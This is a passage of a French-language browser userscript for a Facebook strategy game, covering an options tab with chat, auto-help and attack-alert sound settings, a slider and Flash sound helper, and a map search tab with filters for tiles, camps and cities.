        <TR><TD><INPUT id=ptAllowFB '+ (GlobalOptions.autoPublishGamePopups?'CHECKED ':'') +' type=checkbox /></td><TD>Activer la publication des aides automatiquement sur Facebook pour '+ htmlSelector({0:'----', 80:'Tout le monde', 50:'Amis des amis', 40:'Amis seulement', 10:'Seulement moi'},GlobalOptions.autoPublishPrivacySetting,'id=selectprivacymode') +'</td></tr>\
        <TR><TD colspan=2><B>Configuration du tchat :</b></td></tr>\
        <TR><TD><INPUT id=pbChatREnable type=checkbox /></td><TD>Mettre le tchat &agrave; droite du jeu</td></tr>\
        <TR><TD><INPUT id=ptEnableFoodWarnTchat type=checkbox /></td><TD>Activer le post automatique sur tchat alliance en cas d\'autonomie en rouge</td></tr>\
        <TR><TD><INPUT id=HelpReq type=checkbox /></td><TD>Cliquer automatiquement sur les demandes d\'aides</td></tr>\
        <TR><TD><INPUT id=DelReq type=checkbox /></td><TD>Supprimer automatiquement les demandes d\'aides</td></tr>\
        <TR><TD colspan=2><BR><B>Configuration de TowerAlert :</b></td></tr>\
	<TR><TD><INPUT id=pcalertEnable type=checkbox '+ (Options.alertConfig.aChat?'CHECKED ':'') +'/></td><TD>Poster Automatique les attaques entrantes sur le tchat alliance.</td></tr>\
	<TR><TD align=right>Message Prefix : &nbsp; </td><TD><INPUT id=pcalertPrefix type=text size=55 maxlength=120 value="'+ Options.alertConfig.aPrefix +'" \></td></tr>\
        <TR><TD><INPUT id=boSoundEnable type=checkbox '+ (Options.alertSound.enabled?'CHECKED ':'') +'/></td><TD>Activer la lecture d\'un son sur une attaque entrante</td></tr>\
	<TR><TD></td><TD><DIV id=boLoadingSwf>Chargement du SWF player</div><DIV style="display:none" id=boSoundOpts><TABLE cellpadding=0 cellspacing=0>\
	<TR><TD align=right>Fichier son : &nbsp; </td><TD><INPUT id=bosoundFile type=text size=55 maxlength=160 value="'+ Options.alertSound.soundUrl +'" \>\
	&nbsp; </td><TD><INPUT id=boSoundLoad type=submit value="Charger"><INPUT id=boSoundDefault type=submit value=Default></td></tr>\
	<TR><TD align=right>Volume : &nbsp; </td><TD><TABLE cellpadding=0 cellspacing=0 class=pbTab><TR valign=middle><TD><SPAN id=boVolSlider></span></td><TD width=15></td><TD align=right id=boVolOut>0</td></td></table></td><TD align=center><SPAN id=boLoadStat>xx</span></td></tr>\
	<TR><TD align=right><INPUT id=boSoundRepeat type=checkbox '+ (Options.alertSound.repeat?'CHECKED ':'') +'/></td><TD>Repeter <INPUT id=boSoundEvery type=text size=2 maxlength=5 value="'+ Options.alertSound.repeatDelay +'"> minutes</td></tr>\
	<TR><TD></td><TD>Jouer pendant <INPUT id=boSoundLength type=text size=3 maxlength=5 value="'+ Options.alertSound.playLength +'"> secondes</td></tr>\
	<TR><TD></td><TD><INPUT type=submit value="Tester" id=boPlayNow> &nbsp; <INPUT id=boSoundStop type=submit value="Stop Sound Alert"></td></tr></table></div></td></tr>\
        </table></table><BR><BR><HR>'+ miseajour+'</div>'
        t.cont.innerHTML = m;
     t.mss = new CmatSimpleSound("http://beworld.perso.sfr.fr/bao/alarmplayer.swf", null, {height:0, width:0}, t.e_swfLoaded, 'debug=n');
     t.mss.swfDebug = function (m){ logit ('SWF: '+ m)};
     t.mss.swfPlayComplete = t.e_soundFinished;
     t.mss.swfLoadComplete = t.e_soundFileLoaded;
     unsafeWindow.matSimpleSound01 = t.mss;
 
     t.volSlider = new SliderBar (ById('boVolSlider'), 200, 21, 0);
     t.volSlider.setChangeListener(t.e_volChanged);
     ById('boPlayNow').addEventListener ('click', function (){t.playSound(false)}, false);
     ById('boSoundStop').addEventListener ('click', t.stopSoundAlerts, false);
    
     ById('boSoundRepeat').addEventListener ('change', function (e){Options.alertSound.repeat = e.target.checked;saveOptions();}, false);
     ById('boSoundEvery').addEventListener ('change', function (e){Options.alertSound.repeatDelay = e.target.value;saveOptions();}, false);
     ById('boSoundLength').addEventListener ('change', function (e){Options.alertSound.playLength = e.target.value;saveOptions();}, false);
     ById('boSoundEnable').addEventListener ('change', function (e){Options.alertSound.enabled = e.target.checked;saveOptions();}, false);
 
     ById('boSoundStop').disabled = true;
     ById('bosoundFile').addEventListener ('change', function (){
            Options.alertSound.soundUrl = ById('bosoundFile').value;
            t.loadUrl (Options.alertSound.soundUrl);
            saveOptions();
     }, false);
     ById('boSoundDefault').addEventListener ('click', function (){
            ById('bosoundFile').value = DEFAULT_ALERT_SOUND_URL;
            Options.alertSound.soundUrl = DEFAULT_ALERT_SOUND_URL;
            t.loadUrl (DEFAULT_ALERT_SOUND_URL);
            saveOptions();
    }, false);
        t.togOpt ('ptAllowWinMove', 'ptWinDrag', mainPop.setEnableDrag);
        t.togOpt ('ptEnableFoodWarnTchat', 'enableFoodWarnTchat', FoodAlerts.init);
	t.togOpt ('pbGoldEnable', 'pbGoldEnable', CollectGold.setEnable);
	t.togOpt ('pbRessEnable', 'pbRessEnable', CollectRessource.setEnable);
	t.changeOpt ('pbeverymins', 'pbEveryMins' , RefreshEvery.setTimer);
	t.togOpt ('pbEveryEnable', 'pbEveryEnable', RefreshEvery.setEnable);
	
	t.togOpt ('pbChatREnable', 'pbChatOnRight', WideScreen.setChatOnRight);
	t.togOpt ('HelpReq', 'HelpRequest');
	t.togOpt ('DelReq', 'DeleteRequest');
	t.changeOpt ('pbgoldLimit', 'pbGoldHappy');
	t.changeOpt ('pbLimitRess', 'pbRessTime');
	
	  document.getElementById('ptAllowFB').addEventListener ('change', function(){
	      		GlobalOptions.autoPublishGamePopups = document.getElementById('ptAllowFB').checked;
				GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
	      },false);	
	  
	      document.getElementById('selectprivacymode').addEventListener ('change', function(){
	      		GlobalOptions.autoPublishPrivacySetting = document.getElementById('selectprivacymode').value;
				GM_setValue ('Options_??', JSON2.stringify(GlobalOptions));
      },false);
	document.getElementById('optFoodHours').addEventListener ('change', function () {
	            var x = document.getElementById('optFoodHours').value; 
	            if (isNaN(x) || x<0.01 || x>99999){
	              document.getElementById('optFoodHours').value = Options.foodWarnHours;
	              return;
	            }
	            Options.foodWarnHours = x; 
	            saveOptions();
	          }, false);
       document.getElementById('pcalertEnable').addEventListener ('change', t.e_alertOptChanged, false);
       document.getElementById('pcalertPrefix').addEventListener ('change', t.e_alertOptChanged, false);
       
      } catch (e) {
        t.cont.innerHTML = '<PRE>'+ e.name +' : '+ e.message +'</pre>';  
      }      
 
   },
    stopSoundAlerts : function (){
       var t = my.Options;
       obj = ById('boSoundStop');
   	t.mss.stop (1);
       clearTimeout (t.soundStopTimer);
       clearTimeout (t.soundRepeatTimer);
       ById('boSoundStop').disabled = true;
       Options.alertSound.alarmActive = false;
       Options.alertSound.expireTime = 0;
     },
     e_soundFileLoaded : function (chan, isError){
         if (chan != 1)
           return;
         if (isError)  
           ById('boLoadStat').innerHTML = 'Erreur !';
         else
           ById('boLoadStat').innerHTML = 'Charg&eacute;';
       },  
     playSound : function (doRepeats){
         var t = my.Options;
         ById('boSoundStop').disabled = false;
         clearTimeout (t.soundStopTimer);
         clearTimeout (t.soundRepeatTimer);
         t.mss.play(1, 0);
         t.soundStopTimer = setTimeout (function(){t.mss.stop(1); t.e_soundFinished(1)}, Options.alertSound.playLength*1000);
         if (doRepeats && Options.alertSound.repeat)
           t.soundRepeatTimer = setTimeout (function (){t.playSound(true)}, Options.alertSound.repeatDelay*60000);
         else
           Options.alertSound.alarmActive = false;
       },
      e_soundFinished : function (chan){ 
       var t = my.Options;
       if (chan != 1)
         return;
       if (!Options.alertSound.alarmActive){
         ById('boSoundStop').disabled = true;
       }
     },        
     soundTheAlert : function (){
         var t = my.Options;
         Options.alertSound.alarmActive = true;
         t.playSound(true);
  },
  loadUrl : function (url){
          var t = my.Options;
          t.mss.load (1, url, true);
          ById('boLoadStat').innerHTML = 'Chargement';
     },
     e_swfLoaded : function (){
          var t = my.Options;
          ById('boLoadingSwf').style.display = 'none';
          ById('boSoundOpts').style.display = 'inline';
          t.volSlider.setValue (Options.alertSound.volume/100);
          t.loadUrl (Options.alertSound.soundUrl);
          setTimeout (function (){t.mss.setVolume (1, Options.alertSound.volume);}, 500);
          if (Options.alertSound.alarmActive && Options.alertSound.expireTime>unixTime())   {
            t.soundTheAlert();
          }
      },
      e_volChanged : function (val){
        var t = my.Options;
        ById('boVolOut').innerHTML = parseInt(val*100);
        Options.alertSound.volume = parseInt(val*100);
        t.mss.setVolume (1, Options.alertSound.volume);
    },
   hide : function (){
    },

    togOpt : function (checkboxId, optionName, callOnChange){
      var t = my.Options;
      var checkbox = document.getElementById(checkboxId);
      if (Options[optionName])
        checkbox.checked = true;
      checkbox.addEventListener ('change', eventHandler, false);
      function eventHandler (){
        Options[optionName] = this.checked;
        saveOptions();
        if (callOnChange)
          callOnChange (this.checked);
      }
    },
    
    changeOpt : function (valueId, optionName, callOnChange){
      var t = my.Options;
      var e = document.getElementById(valueId);
      e.value = Options[optionName];
      e.addEventListener ('change', eventHandler, false);
      function eventHandler (){
        Options[optionName] = this.value;
        saveOptions();
        if (callOnChange)
          callOnChange (this.value);
      }
    },
     e_alertOptChanged : function (){
      Options.alertConfig.aChat = document.getElementById('pcalertEnable').checked;
      Options.alertConfig.aPrefix=document.getElementById('pcalertPrefix').value; 
      saveOptions();
      TowerAlerts.setPostToChatOptions(Options.alertConfig);
  },	
}
function SliderBar (container, width, height, value, classPrefix, margin){
  var self = this;
  this.listener = null;
  if (value==null)
    value = 0;
  if (!margin)
    margin = parseInt(width*.05);
  this.value = value;
  if (width<20) width=20;
  if (height<5) height=5;
  if (classPrefix == null){
    classPrefix = 'slider';
    var noClass = true;
  }      
  var sliderHeight = parseInt(height/2);  
  var sliderTop = parseInt(height/4);
  this.sliderWidth = width - (margin*2);
    
  this.div = document.createElement ('div');  
  this.div.style.height = height +'px';
  this.div.style.width = width +'px';
  this.div.className = classPrefix +'Cont';
  if (noClass)
    this.div.style.backgroundColor='#ddd';
  
  this.slider = document.createElement ('div');
  this.slider.setAttribute ('style', 'position:relative;');
  this.slider.style.height = sliderHeight + 'px'
  this.slider.style.top = sliderTop + 'px';
  this.slider.style.width = this.sliderWidth +'px';
  this.slider.style.left = margin +'px';
  this.slider.className = classPrefix +'Bar';
  this.slider.draggable = true;
  if (noClass)
    this.slider.style.backgroundColor='#fff';
  
  this.sliderL = document.createElement ('div');
  this.sliderL.setAttribute ('style', 'width:100px; height:100%; position:relative; ');
  this.sliderL.className = classPrefix +'Part';
  this.sliderL.draggable = true;
  if (noClass)
    this.sliderL.style.backgroundColor='#0c0';
  
  this.knob = document.createElement ('div');
  this.knob.setAttribute ('style', 'width:3px; position:relative; left:0px; background-color:#222');
  this.knob.style.height = height +'px';
  this.knob.style.top = (0-sliderTop) +'px';
  this.knob.className = classPrefix +'Knob';
  this.knob.draggable = true;
  this.slider.appendChild(this.sliderL);
  this.sliderL.appendChild (this.knob);
  this.div.appendChild (this.slider);
  container.appendChild (this.div);
  this.div.addEventListener('mousedown',  mouseDown, false);

  this.getValue = function (){
    return self.value;
  }

  this.setValue = function (val){
    var relX = (val * self.sliderWidth);
    self.sliderL.style.width = relX + 'px';
    self.knob.style.left =  relX + 'px';
    self.value = val;
    if (self.listener)
      self.listener(self.value);
  }
  
  this.setChangeListener = function (listener){
    self.listener = listener;
  }

  function moveKnob (me){
    var relX = me.clientX - self.divLeft;
    if (relX < 0)
      relX = 0;
    if (relX > self.sliderWidth)
      relX = self.sliderWidth;
    self.knob.style.left = (relX - (self.knob.clientWidth/2) ) +'px';
    self.sliderL.style.width = relX + 'px';
    self.value =  relX / self.sliderWidth;   
    if (self.listener)
      self.listener(self.value);
  }
  function doneMoving (){
    self.div.removeEventListener('mousemove', mouseMove, true);
    document.removeEventListener('mouseup', mouseUp, true);
  }  
  function mouseUp (me){
    moveKnob (me);
    doneMoving();
  }
  
  function mouseDown(me){
    var e = self.slider;
    self.divLeft = 0;
    while (e.offsetParent){
      self.divLeft += e.offsetLeft;
      e = e.offsetParent;
    }
    moveKnob (me);
    document.addEventListener('mouseup',  mouseUp, true);
    self.div.addEventListener('mousemove',  mouseMove, true);
  }
  function mouseMove(me){
    moveKnob (me);
  }
}
function CmatSimpleSound (playerUrl, container, attrs, onLoad, flashVars) {
  var self = this;
  this.player = null;
  this.volume = 100;
  this.isLoaded = false;
  this.onSwfLoaded = null;
  var div = document.createElement ('div');
  this.onSwfLoaded = onLoad;
  if (navigator.appName.toLowerCase().indexOf('microsoft')+1) {
    div.innerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0"><param name="movie" value="'+playerUrl+'"><param name="quality" value="high"></object>';
    this.player = div.getElementsByTagName('object')[0];
  } else {
    div.innerHTML = '<embed src="'+playerUrl+'"  bgcolor="#eeeeee" allowfullscreen=false FlashVars="'+ flashVars +'" quality="high" allowscriptaccess="always" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" ></embed>';
    this.player = div.getElementsByTagName('embed')[0].wrappedJSObject;
  }
  if (container)
    container.appendChild (div);
  else
    document.body.appendChild (div);
  for (k in attrs)
    this.player.setAttribute(k, attrs[k]);
       
  this.setVolume = function (chanNum, vol){
    if (!self.isLoaded)
      return;
    self.player.jsSetVolume (chanNum, vol);
    volume = vol;
  }
  
  this.load = function (chanNum, url, bStream, bAutoplay, bUsePolicyFile){ 
    self.player.jsLoad (chanNum, url, bStream, bAutoplay, bUsePolicyFile);
  }
  
  this.play = function (chanNum, position){
    if (self.player.jsPlay)  self.player.jsPlay (chanNum, position);
  }
    
  this.stop = function (chanNum){
   if (!self.isLoaded)
      return;
    self.player.jsStop (chanNum);
  }
    
  this.getStatus = function (chanNum){   
    return self.player.jsGetStatus (chanNum);
  }
  
  this.debugFunc = function (msg){ 
  }
      
  this.swfDebug = function (msg){ 
    self.debugFunc('SWF: '+ msg);
  }
  this.swfLoaded = function (){ 
    self.isLoaded = true;
    self.debugFunc ('playerIsReady');
    if (self.onSwfLoaded)
      self.onSwfLoaded();
  }
  this.swfPlayComplete = function (chanNum){ 
  }
  this.swfLoadComplete = function (chanNum, isError){ 
  }
}
function htmlSelector (valNameObj, curVal, tags){
  var m = [];
  m.push ('<SELECT');
  if (tags){
    m.push (' ');
    m.push (tags);
  }  
  for (var k in valNameObj){
    m.push ('><OPTION ');
    if (k == curVal)
      m.push ('SELECTED ');
    m.push ('value="');
    m.push (k);
    m.push ('">');
    m.push (valNameObj[k]);
    m.push ('</option>');
  }
  m.push ('</select>');
  return m.join ('');
}

/********************************* Search Tab *************************************/


my.Search = {
  cont:null,
  state : null,

  opt : {},

  searchRunning : false,
  tilesSearched : 0,
  tilesFound : 0,
  curX : 0,
  curY : 0,
  lastX : 0,
  firstX : 0,
  firstY : 0,
  lastY : 0,
  sourceCity :null,
  init : function (){
    var t = my.Search;
    this.cont = document.createElement('div');
    unsafeWindow.BOPCpo2 = t.clickedPlayerCheckOnline;
    unsafeWindow.BOPCplo2 = t.clickedPlayerGetLastLogin;
    return this.cont;
  },

  getContent : function (){
    var t = my.Search;
    return t.cont;
  },

  hide : function (){
 
  },

  show : function (cont){
    var t = my.Search;

      if (t.state == null){
        this.cont.innerHTML = '\
          <DIV class=ptentry><table><tr valign=bottom><TD class=xtab width=100 align=right>Type : </td><TD>\
          <SELECT id="srcType">\
            <OPTION selected value=1>Terres Sauvages</option>\
  	    <OPTION value=0>Camps Barbares</option>\
  	   <OPTION value=2>Villes</option>\
          </select></td></tr>\
        </table>\
         <DIV id="srcOpts" style="height:80px"></div></div>\
        <DIV id="srcResults" style="height:400px; max-height:400px;"></div>';
      m = '<TABLE><TR valign=middle><TD class=xtab width=100 align=right>Centre : &nbsp; X: </td><TD class=xtab>\
        <INPUT id="srchX" type=text\ size=3> &nbsp; Y: <INPUT id="srchY" type=text\ size=3> &nbsp;<SPAN id=spInXY></span>';
    	  m += '</td></tr><TR><TD class=xtab align=right>Distance : </td><TD class=xtab>entre <INPUT id=srcaDist size=4 value=0 /> et <INPUT id=srcDist size=4 value=30 /></td></tr>';
          m += '<TR><TD class=xtab></td><TD class=xtab><INPUT id=srcStart type=submit value="Lancer la recherche"/></td></tr>';
      m += '</table>';
    
      document.getElementById ('srcOpts').innerHTML = m;
      var citysrc0=new CdispCityPicker ('srchdcp', document.getElementById ('spInXY'), false, t.clickCitySourceSelect, Cities.byID[unsafeWindow.currentcityid].idx);
      document.getElementById ('srcStart').addEventListener ('click', t.clickedSearch, false);
      
      t.state = 1;
     }
  },
   clickCitySourceSelect : function (city){
    var t = my.Search;
    t.sourceCity = city;
    document.getElementById ('srchX').value=t.sourceCity.c.x;
    document.getElementById ('srchY').value=t.sourceCity.c.y;
   },
  clickedPlayerCheckOnline : function (span, uid){
          var t = my.AllianceList;
          var s = my.Search;
            span.onclick = '';
            span.innerHTML = "recherche en cours...";
            t.fetchPlayerStatusSimple (uid, function (r) {s.gotPlayerStatus(r, span, uid)});
          },

  clickedPlayerGetLastLogin : function (span, uid){
     var t = my.AllianceList;
     var s = my.Search;
            span.onclick = '';
            span.innerHTML = "recherche en cours ...";
            t.fetchPlayerLastLogin (uid, function (r) {s.gotPlayerLastLogin(r, span)});
  },
  gotPlayerStatus : function (rslt, span,uid){
        var t = my.AllianceList;
        if (!rslt.ok){
          span.innerHTML = rslt.errorMsg;
          return;
        }
    
        var p = rslt.data;
        if (p[uid] == true) {
          m = '<span style="color:green"><b>En Ligne!</b></span>';
        } else {
           m = '<span style="color:red"><b>Pas en ligne</b></span>';
        }  
        span.innerHTML = m + '';
      },
    
  gotPlayerLastLogin : function (rslt, span){
        var t = my.AllianceList;
        if (!rslt.ok){
          span.innerHTML = rslt.errorMsg;
          return;
        }
    
        var p = rslt.playerInfo;
        var lastLogin = rslt.playerInfo.lastLogin;
        
        if (lastLogin) {
          m = '<span style="color:black">'+lastLogin+'</span>';
        } else {
           m = '<span style="color:red">?</span>';
        }  
        span.innerHTML = m + '';
    },
  
  clickedSearch : function (){
      var t = my.Search;
  
      if (t.searchRunning){
        t.stopSearch ('RECHERCHE ANNULEE !');
        return;
     }
    t.opt.searchType = document.getElementById ('srcType').value;
        t.opt.startX = parseInt(document.getElementById ('srchX').value);
        t.opt.startY = parseInt(document.getElementById ('srchY').value);
        t.opt.maxDistance = parseInt(document.getElementById ('srcDist').value);
        t.opt.maxDistanceA = parseInt(document.getElementById ('srcaDist').value);
    errMsg = '';
    
    if (isNaN (t.opt.maxDistanceA) ||t.opt.maxDistanceA<0)
         errMsg += "La distance mini doit &ecirc;tre sup&eacute;rieur &agrave; 0<BR>";
    if (isNaN (t.opt.maxDistance) ||t.opt.maxDistance<1)
          errMsg += "La distance maxi doit &ecirc;tre sup&eacute;rieur &agrave; 1<BR>";
    if (t.opt.maxDistance<=t.opt.maxDistanceA)
          errMsg += "La distance max doit &ecirc;tre sup&eacute;rieur &agrave; la distance mini<BR>";
     if(t.opt.maxDistanceA > 375)
           errMsg += "La distance max ne peut d&eacute;passer 375 ! au risque de p&ecirc;ter votre navigateur<BR>";
        if (errMsg != ''){
          document.getElementById('srcResults').innerHTML = '<FONT COLOR=#660000>ERREUR :</font><BR><BR>'+ errMsg;
          return;
    }
    
    t.searchRunning = true;
      document.getElementById ('srcStart').value = 'Stopper la recherche';
        m = '<DIV class=ptstat><TABLE width=100% cellspacing=0><TR><TD class=xtab width=125><DIV id=statSearched></div></td>\
            <TD class=xtab align=center><SPAN id=statStatus></span></td>\
            <TD class=xtab align=right width=125><DIV id=statFound></div></td></tr></table></div>\
          <TABLE width=100%><TR valign=top><TD><DIV id=divOutTab style="height:500px; max-height:500px; overflow-y:auto; width:100%;"></div></td>\
          <TD id="tddivOutOpts" width="290px" height=100% style="background:#e0e0f0; height:100%; padding:5px, top:0px"><DIV id=divOutOpts style="width:260px"></div></td></tr></table><br><input type=checkbox id=ShowHideOpts>Cacher les options';
    document.getElementById('srcResults').innerHTML = m;
    
    
    document.getElementById('ShowHideOpts').addEventListener ('click', function (){
    		  if (document.getElementById("ShowHideOpts").checked) {
    		  document.getElementById("tddivOutOpts").style.display="none";
    		  //document.getElementById("divOutTab").style.width="740px";
    		  } else {
    		  document.getElementById("tddivOutOpts").style.display="block";
    		  //document.getElementById("divOutTab").style.width="460px";
    		  }
	  }, false);

   if (t.opt.searchType == 0)
       typeName = 'Camps Barbares';
     else if (t.opt.searchType == 1)
       typeName = 'Terres Sauvages';
 	else  
 	  typeName = 'Villes';
 
     m = '<CENTER><B>Recherche de '+ typeName +'<BR>\
         Centre : '+ t.opt.startX +','+ t.opt.startY +'  &nbsp; Distance : '+ t.opt.maxDistanceA +' &agrave; '+ t.opt.maxDistance +'<BR></center>\
         <DIV class=ptentry><TABLE cellspacing=0 width=100%><TR align=center><TD class=xtab colspan=10><B>OPTIONS :</b><BR></td></tr>';
     if (t.opt.searchType == 1 || t.opt.searchType == 0) {
      m += '<TR><TD class=xtab align=right>Niveau Min. :</td><TD class=xtab> <INPUT id=filMinLvl size=2 value='+ Options.srcMinLevel +' /></td></tr>\
         <TR><TD class=xtab align=right>Niveau Max. :</td><TD class=xtab> <INPUT id=filMaxLvl size=2 value='+ Options.srcMaxLevel +' /></td></tr>';
 	}
     if (t.opt.searchType == 1){
       m += '<TR><TD class=xtab align=right>R&eacute;gion :</td><TD class=xtab align=right>\
             Foret<INPUT id=woodWild type=CHECKBOX'+ (Options.woodWild?' CHECKED':'') +'></td></tr>';
       m += '<TR><TD class=xtab align=right>Paturage/Fleuve<INPUT  id=foodWild type=CHECKBOX '+ (Options.foodWild?' CHECKED':'') +'></td>\
 	       <TD class=xtab align=right>Montagne<INPUT id=mtnWild type=CHECKBOX '+ (Options.mtnWild?' CHECKED':'') +'></td></tr>';
       m += '<TR><TD class=xtab align=right>Plaine<INPUT id=plnWild type=CHECKBOX '+ (Options.plnWild?' CHECKED':'') +'></td>\
            <TD class=xtab align=right>Collines<INPUT id=hillWild type=CHECKBOX'+ (Options.hillWild?' CHECKED':'') +'></td></tr>';
       m += '<TR><TD class=xtab align=right>Libre Seulement :</td><TD class=xtab><INPUT id=filUnowned type=CHECKBOX '+ (Options.unownedOnly?' CHECKED':'') +'\><td></tr>';
     } 
     if (t.opt.searchType == 1 || t.opt.searchType == 0) {
         m+= '<TR><TD class=xtab align=right>Trier Par :</td><TD class=xtab><SELECT id=filSortBy>\
           <OPTION value="level" '+ (Options.srcSortBy=='level'?'SELECTED':'')  +'>Niveau</option>\
           <OPTION value="dist" '+ (Options.srcSortBy=='dist'?'SELECTED':'')  +'>Distance</option>';
           if (t.opt.searchType == 1) {
                 m+= '<OPTION value="play" '+ (Options.srcSortBy=='play'?'SELECTED':'')  +'>Joueur</option>';
           m+= '<OPTION value="alli" '+ (Options.srcSortBy=='alli'?'SELECTED':'')  +'>Alliance</option>';
             }    
 		  m+= '</select></td></tr>\
 			<TR><TD class=xtab align=right>Coords :</td><TD class=xtab><INPUT type=checkbox id=coordsOnly \></td></tr>\
 			</table></div><BR><SPAN id=srchSizeWarn></span><DIV id=BOpbSrcExp></div>';
     } else {
 			
 		m+= '<TR><TD class=xtab align=right >Voir :</td><TD class=xtab align=left ><SELECT style="width: 135px" id=idSrchFilter>\
              <OPTION value=0>Toutes les villes</option>\
              <OPTION value=1>Hostile Seulement</option>\
 	     <OPTION value=2>Sous la brume Seulement</option>\
 	     <OPTION value=3>Allie Seulement</option>\
 	     <OPTION value=4>Amis Seulement</option>\
 	     <OPTION value=5>Neutre Seulement</option>\
 	     <OPTION value=6>Sans alliance Seulement </option>\
              </select></td></tr>';
 	
 		m+= '<TR><TD class=xtab align=right>Trier Par :</td><TD class=xtab><SELECT id=filSortBy>\
           <OPTION value="might" '+ (Options.srcSortBy=='might'?'SELECTED':'')  +'>Puissance</option>\
           <OPTION value="dist" '+ (Options.srcSortBy=='dist'?'SELECTED':'')  +'>Distance</option>\
                   <OPTION value="play" '+ (Options.srcSortBy=='play'?'SELECTED':'')  +'>Joueur</option>\
         <OPTION value="alli" '+ (Options.srcSortBy=='alli'?'SELECTED':'')  +'>Alliance</option>\
         </select></td></tr>\
         <tr><TD class=xtab align=right>Puissance mini :</td><TD class=xtab><select id=filPuissance>\
          <option value="0" '+ (Options.filPuissance=='0'?'SELECTED':'')  +'>0</option>\
          <option value="500" '+ (Options.filPuissance=='500'?'SELECTED':'')  +'>500</option>\
          <option value="2500" '+ (Options.filPuissance=='2500'?'SELECTED':'')  +'>2 500</option>\
          <option value="10000" '+ (Options.filPuissance=='10000'?'SELECTED':'')  +'>10 000</option>\
          <option value="50000" '+ (Options.filPuissance=='50000'?'SELECTED':'')  +'>50 000</option>\
          <option value="100000" '+ (Options.filPuissance=='100000'?'SELECTED':'')  +'>100 000</option>\
          <option value="500000" '+ (Options.filPuissance=='500000'?'SELECTED':'')  +'>500 000</option>\
          <option value="1000000" '+ (Options.filPuissance=='1000000'?'SELECTED':'')  +'>1 000 000</option>\
          </select></td></tr>\
          <tr><TD class=xtab align=right>Puissance max :</td><TD class=xtab><select id=filPuissanceMax>\
          <option value="500" '+ (Options.filPuissanceMax=='500'?'SELECTED':'')  +'>500</option>\
          <option value="2500" '+ (Options.filPuissanceMax=='2500'?'SELECTED':'')  +'>2 500</option>\
          <option value="10000" '+ (Options.filPuissanceMax=='10000'?'SELECTED':'')  +'>10 000</option>\
          <option value="50000" '+ (Options.filPuissanceMax=='50000'?'SELECTED':'')  +'>50 000</option>\
          <option value="100000" '+ (Options.filPuissanceMax=='100000'?'SELECTED':'')  +'>100 000</option>\
          <option value="500000" '+ (Options.filPuissanceMax=='100000'?'SELECTED':'')  +'>500 000</option>\
          <option value="1000000" '+ (Options.filPuissanceMax=='1000000'?'SELECTED':'')  +'>1 000 000</option>\
          <option value="100000000" '+ (Options.filPuissanceMax=='100000000'?'SELECTED':'')  +'>100 millions</option>\
          </select></td></tr>\
          <tr><TD class=xtab align=right>Alliance contient :</td><td class=xtab><input type=text size=10 id=filfiltreAlliance value="'+Options.filfiltreAlliance+'"></td></tr>\
        <tr><TD class=xtab align=right>Joueur contient :</td><td class=xtab><input type=text size=10 id=filfiltreJoueur value="'+Options.filfiltreJoueur+'"></td></tr>\
         <TR style="display:none;"><TD class=xtab align=right>Coords :</td><TD class=xtab><INPUT type=checkbox id=coordsOnly \></td></tr>\
          </table></div><BR><SPAN id=srchSizeWarn></span>';	
 	}
     document.getElementById('divOutOpts').innerHTML = m;
     
     
     
     if (t.opt.searchType == 1 || t.opt.searchType == 0) {
 		document.getElementById('filMinLvl').addEventListener ('change', function (){
 		  Options.srcMinLevel = document.getElementById('filMinLvl').value;
 		  saveOptions();
 		  t.dispMapTable ();
 		  }, false);
 		document.getElementById('filMaxLvl').addEventListener ('change', function (){
 		  Options.srcMaxLevel = document.getElementById('filMaxLvl').value;
 		  saveOptions();
 		  t.dispMapTable ();
 		  }, false);
 	 }
 	  document.getElementById('filSortBy').addEventListener ('change', function (){
	        Options.srcSortBy = document.getElementById('filSortBy').value;
	        saveOptions();
	        t.dispMapTable ();
       }, false);
    
     document.getElementById('coordsOnly').addEventListener ('change', function (){ t.dispMapTable (); }, false);
     if (t.opt.searchType == 1){
     document.getElementById('foodWild').addEventListener ('change', function(){
         Options.foodWild = document.getElementById('foodWild').checked;
         saveOptions();
         t.dispMapTable ();
         }, false);
     document.getElementById('hillWild').addEventListener ('change', function(){
         Options.hillWild = document.getElementById('hillWild').checked;
         saveOptions();
         t.dispMapTable();
         }, false);
     document.getElementById('mtnWild').addEventListener ('change', function(){
         Options.mtnWild = document.getElementById('mtnWild').checked;
         saveOptions();
         t.dispMapTable();
         }, false);
     document.getElementById('plnWild').addEventListener ('change', function(){
         Options.plnWild = document.getElementById('plnWild').checked;
         saveOptions();
         t.dispMapTable();
         }, false);
     document.getElementById('woodWild').addEventListener ('change', function(){
         Options.woodWild = document.getElementById('woodWild').checked;
         saveOptions();
         t.dispMapTable ();
         }, false);
       document.getElementById('filUnowned').addEventListener ('change', function (){
         Options.unownedOnly = (document.getElementById('filUnowned').checked);
         saveOptions();
         t.dispMapTable ();
        }, false);
     }
     if (t.opt.searchType == 2){
 
 	document.getElementById('idSrchFilter').addEventListener ('change', function (){
         Options.citySrchFilter = (document.getElementById('idSrchFilter').value);
         saveOptions();
         t.dispMapTable ();
         }, false);
 
 	document.getElementById('idSrchFilter').value = Options.citySrchFilter;
 	
         document.getElementById('filfiltreAlliance').addEventListener ('keyup', function (){
	       Options.filfiltreAlliance = document.getElementById('filfiltreAlliance').value;
	       saveOptions();
	       t.dispMapTable ();
       }, false);
        document.getElementById('filfiltreJoueur').addEventListener ('keyup', function (){
       	       Options.filfiltreJoueur = document.getElementById('filfiltreJoueur').value;
       	       saveOptions();
       	       t.dispMapTable ();
       }, false);
         document.getElementById('filPuissance').addEventListener ('change', function (){
         Options.filPuissance = parseInt(document.getElementById('filPuissance').value);
         saveOptions();
         t.dispMapTable ();
         }, false);
         document.getElementById('filPuissanceMax').addEventListener ('change', function (){
         Options.filPuissanceMax = parseInt(document.getElementById('filPuissanceMax').value);
         saveOptions();
         t.dispMapTable ();
         }, false);
 	
 	}
 
 
 
 
     t.mapDat = [];
     t.firstX =  t.opt.startX - t.opt.maxDistance;
     if (t.firstX<0) t.firstX=0;
     t.lastX = t.opt.startX + t.opt.maxDistance;
     if (t.lastX>800) t.lastX=800;
     t.firstY =  t.opt.startY - t.opt.maxDistance;
     if (t.firstY<0) t.firstY=0;
     t.lastY = t.opt.startY + t.opt.maxDistance;
     if (t.lastY>800) t.lastY=800;
     t.tilesSearched = 0;
     t.tilesFound = 0;
     t.curX = t.firstX;
     t.curY = t.firstY;
